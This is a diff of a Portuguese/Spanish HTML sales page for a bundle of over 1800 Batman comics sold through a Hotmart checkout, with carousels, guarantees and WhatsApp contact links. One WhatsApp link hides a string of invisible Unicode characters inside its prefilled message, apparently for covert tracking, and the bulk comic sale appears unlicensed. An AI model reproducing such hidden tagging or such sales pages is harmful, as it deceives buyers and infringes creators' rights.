-        <div class="faq-a" data-i18n="faq3_a">Não. O pagamento é único e o download fica disponível permanentemente para você.</div>
-      </div>
-      <div class="faq-item">
-        <button class="faq-q" data-i18n="faq4_q">Posso pedir reembolso? <span class="plus">+</span></button>
-        <div class="faq-a" data-i18n="faq4_a">Sim, você tem 7 dias corridos após a compra para solicitar o reembolso integral, sem perguntas.</div>
-      </div>
-      <div class="faq-item">
-        <button class="faq-q" data-i18n="faq5_q">Posso pedir reembolso? <span class="plus">+</span></button>
-        <div class="faq-a" data-i18n="faq5_a">Sim, você tem 7 dias corridos após a compra para solicitar o reembolso integral, sem perguntas.</div>
-      </div>
-      <div class="faq-item">
-        <button class="faq-q" data-i18n="faq5_q">Posso pedir reembolso? <span class="plus">+</span></button>
-        <div class="faq-a" data-i18n="faq5_a">Sim, você tem 7 dias corridos após a compra para solicitar o reembolso integral, sem perguntas.</div>
-      </div>
-      <div class="faq-item">
-        <button class="faq-q" data-i18n="faq6_q">Posso pedir reembolso? <span class="plus">+</span></button>
-        <div class="faq-a" data-i18n="faq6_a">Sim, você tem 7 dias corridos após a compra para solicitar o reembolso integral, sem perguntas.</div>
-      </div>
-    </div>
-  <div class="mais_button" style="justify-content: left;" >
-    <a href="#preco" id="hero-cta" class="btn-primary " >acceder ahora a la colección completa del batman</a>
-  </div>
-  </div>
-</section>
-
-</main>
-
-<footer>
-  <div class="wrap">
-    
-    <div class="footer-row">
-      <div class="footer_image">
-          <img src="./batman_header_3.png" >
+        <div class="hero-container">
+          <div class="hero-content">
+            <div class="eyebrow">
+              <span class="dot"></span
+              ><span class="mono" data-i18n="hero_eyebrow"
+                >Coleção original</span
+              >
+            </div>
+            <h1 class="margin-tp" data-i18n="hero_title">
+              Papéis de parede para quem<br />vive na <em>penumbra</em> de
+              Gotham.
+            </h1>
+            <div class="hero-actions">
+              <a
+                href="#preco"
+                id="hero-cta"
+                class="btn-primary"
+                data-i18n="hero_button"
+                >Comprar com desconto</a
+              >
+              <span class="hero-meta" data-i18n="hero_meta"
+                >Formato <b>4K</b> · Desktop e celular · Arquivo original, sem
+                marca d'água</span
+              >
+            </div>
+          </div>
+          <div class="hero_image">
+            <img
+              src="batman_header_3.png"
+              alt="imagem do batman e suas responsividades de tela para mobile, tablets e pc's"
+            />
+          </div>
         </div>
-      <div class="social-links">
-        <a href="https://www.instagram.com/goldclipsofc?igsh=MXkwNGQwNWYwdG10" data-i18n="instagram">Instagram</a>
-        <a href="https://www.tiktok.com/@goldclips_ofc?_r=1&_t=ZS-98o8kZOkuX6" data-i18n="tiktok">TikTok</a>
-        <a href="https://wa.me/5524992834072?text=Me%20interesan%20los%20c%C3%B3mics%20de%20Batman%3B%20%C2%BFpodr%C3%ADas%20explicarme%20un%20poco%20m%C3%A1s%20c%C3%B3mo%20funciona%3F" data-i18n="contact">Contacto</a>
+      </section>
+
+      <section id="arquivo">
+        <div class="wrap">
+          <div class="section-head">
+            <span class="mono margin-bt" data-i18n="package_eyebrow"
+              >Conteúdo do pacote</span
+            >
+            <h2 class="margin-tp" data-i18n="package_title">
+              Más de 1800 cómics organizados cronológicamente.
+            </h2>
+            <p data-i18n="package_text">Descubre todos que recibás:</p>
+          </div>
+          <div class="carousel">
+            <div class="case-track">
+              <div class="case-grid">
+                <div class="case">
+                  <div class="case-art art-1"></div>
+                  <div class="case-label">
+                    <span class="mono"> </span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-2"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-3"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-4"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-5"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-6"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-7"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-8"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-9"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-10"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-11"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-12"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-13"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-14"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-15"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-16"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-17"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-18"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-19"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-20"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-21"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-22"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-23"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-24"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+              </div>
+              <div class="case-grid">
+                <div class="case">
+                  <div class="case-art art-1"></div>
+                  <div class="case-label">
+                    <span class="mono"> </span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-2"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-3"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-4"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-5"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-6"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-7"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-8"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-9"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-10"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-11"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-12"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-13"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-14"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-15"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-16"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-17"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-18"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-19"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-20"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-21"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-22"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-23"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-24"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+              </div>
+              <div class="case-grid">
+                <div class="case">
+                  <div class="case-art art-1"></div>
+                  <div class="case-label">
+                    <span class="mono"> </span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-2"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-3"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-4"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-5"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-6"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-7"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-8"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-9"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-10"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-11"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-12"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-13"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-14"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-15"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-16"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-17"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-18"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-19"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-20"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-21"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-22"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-23"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-24"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section class="mais_section">
+        <div class="mais_container">
+          <div class="mais_card">
+            <div class="mais_icone">
+              <svg
+                width="34"
+                height="34"
+                viewBox="0 0 24 24"
+                fill="none"
+                xmlns="http://www.w3.org/2000/svg"
+              >
+                <path
+                  d="M12 2L4 5V11C4 16 7.4 20.7 12 22C16.6 20.7 20 16 20 11V5L12 2Z"
+                  stroke="#FACC15"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                />
+                <path
+                  d="M9 12L11 14L15 10"
+                  stroke="#FACC15"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                />
+              </svg>
+            </div>
+            <h1 class="mais_title">GARANTÍA DE 7 DÍAS</h1>
+            <p class="mais_p">
+              Si el contenido no cumple tus expectativas, puedes solicitar el
+              reembolso de tu compra dentro de los primeros 7 días.
+            </p>
+          </div>
+
+          <div class="mais_card">
+            <div class="mais_icone">
+              <svg
+                width="34"
+                height="34"
+                viewBox="0 0 24 24"
+                fill="none"
+                xmlns="http://www.w3.org/2000/svg"
+              >
+                <path
+                  d="M13 2L4 14H11L10 22L20 9H13L13 2Z"
+                  stroke="#FACC15"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                />
+              </svg>
+            </div>
+            <h1 class="mais_title">ACCESO INMEDIATO</h1>
+            <p class="mais_p">
+              Recibe el acceso automáticamente por correo electrónico
+              inmediatamente después de confirmar tu compra.
+            </p>
+          </div>
+
+          <div class="mais_card">
+            <div class="mais_icone">
+              <svg
+                width="34"
+                height="34"
+                viewBox="0 0 24 24"
+                fill="none"
+                xmlns="http://www.w3.org/2000/svg"
+              >
+                <rect
+                  x="5"
+                  y="11"
+                  width="14"
+                  height="10"
+                  rx="2"
+                  stroke="#FACC15"
+                  stroke-width="2"
+                />
+                <path
+                  d="M8 11V8C8 5.8 9.8 4 12 4C14.2 4 16 5.8 16 8V11"
+                  stroke="#FACC15"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                />
+              </svg>
+            </div>
+            <h1 class="mais_title">PAGO 100 % SEGURO</h1>
+            <p class="mais_p">
+              Tu compra está protegida mediante una plataforma de pago segura y
+              confiable.
+            </p>
+          </div>
+        </div>
+        <div class="mais_button">
+          <a href="#preco" id="hero-cta" class="btn-primary"
+            >quiero acceder a los más de 1800 cómics del batman</a
+          >
+        </div>
+      </section>
+
+      <section
+        id="bonus"
+        style="
+          border-top: 1px solid var(--line);
+          border-bottom: 1px solid var(--line);
+        "
+      >
+        <div class="wrap">
+          <div class="section-head">
+            <span class="mono" data-i18n="bonus_eyebrow"
+              >O que mais vem junto</span
+            >
+            <h2 class="margin-tp" data-i18n="bonus_title">
+              bônus, sem enrolação
+            </h2>
+          </div>
+          <div class="bonus-grid">
+            <div class="bonus-card bonus_bg_1"></div>
+            <div class="bonus-card bonus_bg_2"></div>
+          </div>
+        </div>
+      </section>
+
+      <section id="preco">
+        <div class="wrap">
+          <div class="pricing">
+            <div class="pricing-left">
+              <span
+                class="mono"
+                data-i18n="pricing_eyebrow"
+                style="color: #f2c14e"
+                >Acesso único</span
+              >
+              <div class="price_image">
+                <img src="./batman_header_3.png" alt="" />
+              </div>
+              <h2 class="margin-tp">HOY RECIBIRÁS</h2>
+              <ul class="feature-list">
+                <li>Más de 1800 cómics del Batman</li>
+                <li>Bono: Aplicación exclusiva Biblioteca Geek</li>
+                <li>Colección organizada cronológicamente</li>
+                <li>Bono: Guía completa de lectura</li>
+              </ul>
+            </div>
+            <div class="pricing-right">
+              <div class="old-price" data-i18n="old_price">USD 29.90</div>
+              <div class="new-price" data-i18n="new_price">USD 7.90</div>
+              <div class="price-note" data-i18n="price_note">
+                Pagamento único · sem assinatura
+              </div>
+              <a
+                href="https://pay.hotmart.com/V107223799N?checkoutMode=10"
+                id="buy-cta"
+                class="btn-primary btn-block"
+                data-i18n="buy_button"
+                >Garantir o pacote</a
+              >
+              <h1>
+                el valor se converterá automáticamente a la moneda local en la
+                página de pago
+              </h1>
+              <div class="guarantee-strip">
+                <span data-i18n="guarantee">Garantia 7 dias</span>
+                <span data-i18n="instant_delivery">Entrega imediata</span>
+                <span data-i18n="secure_payment">Pagamento seguro</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section id="arquivo" style="padding-bottom: 0">
+        <div class="wrap">
+          <div class="section-head">
+            <h2 class="margin-tp">DESCUBRE LO QUE OPINAN NUESTROS CLIENTES</h2>
+          </div>
+          <div class="carousel">
+            <div class="case-track-social">
+              <div class="case-grid-social">
+                <div class="case">
+                  <div class="case-art art-30"></div>
+                  <div class="case-label">
+                    <span class="mono"> </span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-31"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-32"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-33"></div>
+                  <div class="case-label">
+                    <span class="mono"> </span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-34"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-35"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+
+                <div class="case">
+                  <div class="case-art art-30"></div>
+                  <div class="case-label">
+                    <span class="mono"> </span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-31"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-32"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+
+                <div class="case">
+                  <div class="case-art art-33"></div>
+                  <div class="case-label">
+                    <span class="mono"> </span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-34"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-35"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="case-track-social">
+              <div class="case-grid-social">
+                <div class="case">
+                  <div class="case-art art-30"></div>
+                  <div class="case-label">
+                    <span class="mono"> </span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-31"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-32"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+
+                <div class="case">
+                  <div class="case-art art-33"></div>
+                  <div class="case-label">
+                    <span class="mono"> </span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-34"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-35"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+
+                <div class="case">
+                  <div class="case-art art-30"></div>
+                  <div class="case-label">
+                    <span class="mono"> </span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-31"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-32"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+
+                <div class="case">
+                  <div class="case-art art-33"></div>
+                  <div class="case-label">
+                    <span class="mono"> </span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-34"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+                <div class="case">
+                  <div class="case-art art-35"></div>
+                  <div class="case-label">
+                    <span class="mono"></span>
+                    <div class="name"></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div
+            class="section-head"
+            style="margin: 56px 0; max-width: 100%; text-align: center"
+          >
+            <h2 class="margin-tp">¿BUSCAS CÓMICS DE OTROS HÉROES?</h2>
+            <div style="margin-top: 56px">
+              <svg
+                fill="#ffffff"
+                height="100px"
+                width="100px"
+                version="1.1"
+                id="Layer_1"
+                xmlns="http://www.w3.org/2000/svg"
+                xmlns:xlink="http://www.w3.org/1999/xlink"
+                viewBox="0 0 511.999 511.999"
+                xml:space="preserve"
+                stroke="#ffffff"
+              >
+                <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+                <g
+                  id="SVGRepo_tracerCarrier"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                ></g>
+                <g id="SVGRepo_iconCarrier">
+                  <g>
+                    <g>
+                      <g>
+                        <path
+                          d="M400.132,311.858c-1.451-2.859-4.395-4.659-7.603-4.659h-85.333v-93.867c0-4.719-3.814-8.533-8.533-8.533h-85.333 c-4.71,0-8.533,3.814-8.533,8.533v93.867h-85.333c-3.209,0-6.144,1.801-7.595,4.659c-1.459,2.867-1.195,6.298,0.7,8.892 L249.1,508.483c1.604,2.21,4.164,3.516,6.895,3.516c2.739,0,5.291-1.306,6.903-3.516L399.432,320.75 C401.327,318.156,401.591,314.726,400.132,311.858z"
+                        ></path>
+                        <path
+                          d="M230.399,187.733h51.2c14.114,0,25.6-11.486,25.6-25.6s-11.486-25.6-25.6-25.6h-51.2c-14.114,0-25.6,11.486-25.6,25.6 S216.285,187.733,230.399,187.733z"
+                        ></path>
+                        <path
+                          d="M230.399,119.467h51.2c14.114,0,25.6-11.486,25.6-25.6s-11.486-25.6-25.6-25.6h-51.2c-14.114,0-25.6,11.486-25.6,25.6 S216.285,119.467,230.399,119.467z"
+                        ></path>
+                        <path
+                          d="M230.399,51.2h51.2c14.114,0,25.6-11.486,25.6-25.6S295.713,0,281.599,0h-51.2c-14.114,0-25.6,11.486-25.6,25.6 S216.285,51.2,230.399,51.2z"
+                        ></path>
+                      </g>
+                    </g>
+                  </g>
+                </g>
+              </svg>
+            </div>
+            <div style="margin-top: 56px">
+              <a
+                href="https://wa.me/5524992834072?text=M%E2%81%A2%E2%80%8D%E2%81%A2%E2%80%8B%E2%80%8D%E2%81%A3%E2%80%8B%E2%81%A1%E2%81%A2%E2%81%A0%E2%81%A2%E2%81%A2%E2%81%A3%E2%81%AC%E2%81%AD%E2%81%AC%E2%81%AD%E2%81%A3%E2%81%A4%CD%8F%E2%81%A0%E2%80%8B%CD%8F%E2%81%A1%E2%80%8B%E2%81%AB%E2%81%A0e%20gustar%C3%ADa%20tener%20acceso%20a%20otros%20tipos%20de%20c%C3%B3mics%3B%20%C2%BFpodr%C3%ADa%20contarme%20m%C3%A1s%20sobre%20ellos%3F"
+                ><svg
+                  height="80px"
+                  width="80px"
+                  version="1.1"
+                  id="Icons"
+                  xmlns="http://www.w3.org/2000/svg"
+                  xmlns:xlink="http://www.w3.org/1999/xlink"
+                  viewBox="0 0 32 32"
+                  xml:space="preserve"
+                  fill="#000000"
+                >
+                  <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+                  <g
+                    id="SVGRepo_tracerCarrier"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                  ></g>
+                  <g id="SVGRepo_iconCarrier">
+                    <style type="text/css">
+                      .st0 {
+                        fill: #ffffff;
+                      }
+                      .st1 {
+                        fill: #3a559f;
+                      }
+                      .st2 {
+                        fill: #f4f4f4;
+                      }
+                      .st3 {
+                        fill: #ff0084;
+                      }
+                      .st4 {
+                        fill: #0063db;
+                      }
+                      .st5 {
+                        fill: #00aced;
+                      }
+                      .st6 {
+                        fill: #ffec06;
+                      }
+                      .st7 {
+                        fill: #ff0000;
+                      }
+                      .st8 {
+                        fill: #25d366;
+                      }
+                      .st9 {
+                        fill: #0088ff;
+                      }
+                      .st10 {
+                        fill: #314358;
+                      }
+                      .st11 {
+                        fill: #ee6996;
+                      }
+                      .st12 {
+                        fill: #01aef3;
+                      }
+                      .st13 {
+                        fill: #fffeff;
+                      }
+                      .st14 {
+                        fill: #f06a35;
+                      }
+                      .st15 {
+                        fill: #00adef;
+                      }
+                      .st16 {
+                        fill: #1769ff;
+                      }
+                      .st17 {
+                        fill: #1ab7ea;
+                      }
+                      .st18 {
+                        fill: #6001d1;
+                      }
+                      .st19 {
+                        fill: #e41214;
+                      }
+                      .st20 {
+                        fill: #05ce78;
+                      }
+                      .st21 {
+                        fill: #7b519c;
+                      }
+                      .st22 {
+                        fill: #ff4500;
+                      }
+                      .st23 {
+                        fill: #00f076;
+                      }
+                      .st24 {
+                        fill: #ffc900;
+                      }
+                      .st25 {
+                        fill: #00d6ff;
+                      }
+                      .st26 {
+                        fill: #ff3a44;
+                      }
+                      .st27 {
+                        fill: #ff6a36;
+                      }
+                      .st28 {
+                        fill: #0061fe;
+                      }
+                      .st29 {
+                        fill: #f7981c;
+                      }
+                      .st30 {
+                        fill: #ee1b22;
+                      }
+                      .st31 {
+                        fill: #ef3561;
+                      }
+                      .st32 {
+                        fill: none;
+                        stroke: #ffffff;
+                        stroke-width: 2;
+                        stroke-miterlimit: 10;
+                      }
+                      .st33 {
+                        fill: #0097d3;
+                      }
+                      .st34 {
+                        fill: #01308a;
+                      }
+                      .st35 {
+                        fill: #019cde;
+                      }
+                      .st36 {
+                        fill: #ffd049;
+                      }
+                      .st37 {
+                        fill: #16a05d;
+                      }
+                      .st38 {
+                        fill: #4486f4;
+                      }
+                      .st39 {
+                        fill: none;
+                      }
+                      .st40 {
+                        fill: #34a853;
+                      }
+                      .st41 {
+                        fill: #4285f4;
+                      }
+                      .st42 {
+                        fill: #fbbc05;
+                      }
+                      .st43 {
+                        fill: #ea4335;
+                      }
+                    </style>
+                    <path
+                      class="st8"
+                      d="M17,0C8.7,0,2,6.7,2,15c0,3.4,1.1,6.6,3.2,9.2l-2.1,6.4c-0.1,0.4,0,0.8,0.3,1.1C3.5,31.9,3.8,32,4,32 c0.1,0,0.3,0,0.4-0.1l6.9-3.1C13.1,29.6,15,30,17,30c8.3,0,15-6.7,15-15S25.3,0,17,0z"
+                    ></path>
+                    <path
+                      class="st0"
